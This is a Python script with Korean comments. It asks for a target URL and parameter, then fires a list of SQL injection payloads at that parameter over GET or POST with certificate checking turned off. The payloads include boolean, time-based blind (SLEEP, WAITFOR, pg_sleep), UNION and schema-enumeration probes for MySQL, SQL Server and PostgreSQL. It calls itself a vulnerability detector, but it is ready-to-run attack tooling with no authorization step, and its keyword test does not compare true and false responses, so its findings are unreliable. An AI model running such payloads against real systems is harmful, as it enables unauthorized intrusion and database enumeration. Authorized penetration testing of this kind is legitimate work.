import requests
import urllib3

# 테스트 용도로 SSL 경고 비활성화; 실제 운영 환경에서는 제거하는 것이 좋습니다.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 사용자 입력을 통한 설정 정보 수집
url = input("URL을 입력하세요: ")
param_name = input("공격할 파라미터 이름을 입력하세요: ")
param_value = input("기본 파라미터 값을 입력하세요 (예: 2): ")
true_response_indicator = input("정상 응답의 특정 키워드 또는 텍스트를 입력하세요: ")
request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()

# 인젝션 페이로드 목록
injection_payloads = [
    # 기본 논리 조건 - 참/거짓 테스트
    "' AND '1'='1 -- ",
    "' AND '1'='2 -- ",
    "AND 1=1 --",
    "AND 1=2 --",
    "OR 'a'='a' -- ",
    "OR 'a'='b' -- ",
    "OR 1=1 --",
    "OR 1=2 --",

    # 괄호와 다양한 특수문자 위치 조합
    "') AND ('1'='1 --",
    "') AND ('1'='2 --",
    "' AND (1=1) --",
    "' AND (1=2) --",
    ") AND (1=1 --",
    ") AND (1=2 --",
    "') OR ('a'='a' --",
    "') OR ('a'='b' --",
    "AND 1=1 /*",
    "AND 1=2 /*",
    "|| 1=1 #",
    "|| 1=2 #",

    # 산술 연산 및 특수 문자 추가
    "' AND ((1+1)=2) /*",
    "' AND ((1+1)=3) /*",
    "AND ((2*2)=4) #",
    "AND ((2*2)=5) #",
    "' AND ((10/2)=5) --",
    "' AND ((10/2)=6) --",

    # 주요 DBMS별 Blind Injection 조건 및 주석 스타일
    "' AND SLEEP(5) --",                      
    "' AND BENCHMARK(1000000,MD5('test')) --", 
    "' AND IF(1=1, SLEEP(5), 0) --",          
    "' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 64 --",
    "' UNION SELECT NULL, NULL#",
    "' OR 1=1 /*",
    "'; WAITFOR DELAY '0:0:5' --",            
    "' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U') --",  
    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects), 1, 1)) > 64 --",
    "' OR 'a' LIKE 'a'--",                    
    "AND 1=1 --",                             
    "'; SELECT pg_sleep(5) --",               
    "' AND 1=(SELECT COUNT(*) FROM pg_catalog.pg_tables) --",
    "' AND ASCII(SUBSTRING((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1), 1, 1)) > 64 --",
    "AND '1'='1' /*",
    "' OR pg_sleep(5) --",
]

# 취약점 탐지 함수
def detect_sql_injection():
    print("[정보] SQL Injection 취약점 탐지 시작...")

    detected_payloads = []  # 탐지된 페이로드를 저장할 리스트

    # 각 페이로드별로 테스트
    for payload in injection_payloads:
        params = {param_name: f"{param_value} {payload}"}

        try:
            # 선택한 방식에 따라 GET 또는 POST 요청을 보냄
            if request_method == "GET":
                response = requests.get(url, params=params, timeout=10, verify=False)  # SSL 검증 비활성화
            elif request_method == "POST":
                response = requests.post(url, data=params, timeout=10, verify=False)  # SSL 검증 비활성화
            else:
                print("[오류] 요청 방식이 잘못되었습니다. GET 또는 POST 중에서 선택하세요.")
                return

            # 응답에서 true_response_indicator 포함 여부 확인
            if true_response_indicator in response.text:
                print(f"[취약점 발견] '{payload}' 페이로드에서 SQL Injection 취약점이 감지되었습니다.")
                detected_payloads.append(payload)
            else:
                print(f"[확인 필요] '{payload}' 페이로드에서는 취약점이 감지되지 않았습니다.")

        except requests.RequestException as e:
            print(f"[오류] '{payload}' 페이로드 테스트 중 오류 발생: {e}")

    # 탐지 결과 출력
    print("\n[결과] SQL Injection 취약점 탐지 종료.")
    print(f"총 {len(detected_payloads)}건의 SQL Injection 취약점이 감지되었습니다.\n")

    if detected_payloads:
        print("탐지된 페이로드 목록:")
        for idx, detected_payload in enumerate(detected_payloads, 1):
            print(f"{idx}. {detected_payload}")

# 프로그램 실행
if __name__ == "__main__":
    detect_sql_injection()
